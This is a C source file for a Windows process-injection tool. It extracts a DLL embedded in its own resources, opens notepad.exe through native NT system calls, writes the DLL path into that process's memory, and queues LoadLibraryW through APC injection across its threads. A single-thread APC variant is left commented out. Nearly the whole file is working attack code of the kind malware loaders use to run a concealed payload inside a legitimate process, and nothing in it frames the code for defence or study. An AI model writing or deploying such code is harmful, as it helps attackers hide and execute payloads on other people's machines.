#include "apc.h"
#include <stdio.h>
#include <tlhelp32.h>
#include <string.h>
#include <stdlib.h>
#include <tchar.h>
#define IDR_DLL2 102

void ExtractEmbeddedDLL() {
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL2), RT_RCDATA);
	if (hRes == NULL) { printf("Failed to find DLL resource.\n"); return; }

	DWORD dwSize = SizeofResource(NULL, hRes);
	if (dwSize == 0) { printf("Failed to get size of DLL resource.\n"); return; }

	HGLOBAL hGlobal = LoadResource(NULL, hRes);
	if (hGlobal == NULL) { printf("Failed to load DLL resource.\n"); return; }

	void* pData = LockResource(hGlobal);
	if (pData == NULL) { printf("Failed to lock resource.\n"); return; }

	FILE* file = NULL;
	errno_t err = fopen_s(&file, "extracted.dll", "wb");
	if (err != 0) { printf("Failed to create output file.\n"); return; }

	fwrite(pData, 1, dwSize, file); fclose(file); printf("DLL extracted to 'extracted.dll'\n");
}


int main() {
	LPWSTR lpProcessName = L"notepad.exe";
	DWORD pid = 0;
	HANDLE hProcess = NULL;
	DWORD tid;
	HANDLE hThread;
	PVOID pAddress = NULL;
	SIZE_T sNumberOfBytesWritten = NULL;
	DWORD dwOldProtection = NULL;
	printf("\n");
	ExtractEmbeddedDLL();

	if (!InitNtFunctions()) { printf("Failed to resolve NT functions.\n"); return 1; }

	if (!GetProcessNative(lpProcessName, &pid)) {
		printf("Failed to get process handle/pid \n"); return;
	} else wprintf(L"[+] Process %s : pid %lu \n", lpProcessName, (unsigned long)pid);

	char fullDllPathA[MAX_PATH];
	DWORD pathLen = GetFullPathNameA("extracted.dll", MAX_PATH, fullDllPathA, NULL);
	if (pathLen == 0) { printf("GetFullPath FAIL: %d\n", GetLastError()); TerminateProcess(hProcess, 1); return 1; }

	wchar_t fullDllPathW[MAX_PATH];
	MultiByteToWideChar(CP_ACP, 0, fullDllPathA, -1, fullDllPathW, MAX_PATH);
	SIZE_T pathSize = (wcslen(fullDllPathW) + 1) * sizeof(wchar_t);  // FIXED!
	OBJECT_ATTRIBUTES objAttr = { 0 };
	CLIENT_ID clientId = { 0 };
	clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
	clientId.UniqueThread = 0;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_SET_INFORMATION | PROCESS_VM_OPERATION
		| PROCESS_VM_READ | PROCESS_VM_WRITE | SYNCHRONIZE, &objAttr, &clientId);
	if (status != STATUS_SUCCESS || hProcess == NULL) { PRINTXD("NtOpenProcess", status); return; }

	// SIZE_T pathSize = pathLen+1;
	SIZE_T originalStringSize = (wcslen(fullDllPathW) + 1) * sizeof(wchar_t);
	SIZE_T regionSize = originalStringSize; // This one will be modified by the kernel
	status = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (status != STATUS_SUCCESS) {
		PRINTXD("NtAllocateVirtualMemory", status); NtClose(hProcess); return;
	} else printf("Memory At : 0x%p \n", pAddress);

	status = NtWriteVirtualMemory(hProcess, pAddress, fullDllPathW, originalStringSize, NULL);
	if (status != STATUS_SUCCESS) { PRINTXD("NtWriteVirtualMemory", status); NtFreeVirtualMemory(hProcess, &pAddress, &pathSize, MEM_RELEASE); NtClose(hProcess); return; }

	status = NtProtectVirtualMemory(hProcess, &pAddress, &pathSize, PAGE_EXECUTE_READ, &dwOldProtection);
	if (STATUS_SUCCESS != status) { PRINTXD("NtProtectVirtualMemory", status); NtFreeVirtualMemory(hProcess, &pAddress, &pathSize, MEM_RELEASE); NtClose(hProcess); return; }

	HMODULE kernel32Base = GetModuleHandleW(L"kernel32.dll");
	FARPROC loadLibAdd = GetProcAddress(kernel32Base, "LoadLibraryW");
	if (loadLibAdd == NULL) { printf("Failed to get address of LoadLibraryA. Error code: %lu\n", GetLastError()); return; }




	if (!(NativeShotgunAPC(pid, pAddress, loadLibAdd))) { printf("fail"); }



	// or single APCInjection version
	/*if (!GetThreadNative(pid, &tid)) { printf("Failed to get thread handle/tid"); return; }
	else printf("[+] Found Thread : tid %lu \n", (unsigned long)tid);
	clientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
	clientId.UniqueThread = (HANDLE)(ULONG_PTR)tid;
	status = NtOpenThread(&hThread, THREAD_SET_CONTEXT |
		THREAD_QUERY_INFORMATION | SYNCHRONIZE, &objAttr, &clientId);
	if (status != STATUS_SUCCESS || hThread == NULL) { PRINTXD("NtOpenThread", status); return; }
	NtAPCinject(hThread, pAddress, loadLibAdd);
	Sleep(2000);*/




	NtClose(hProcess);
	printf(" end");
	return 0;
}
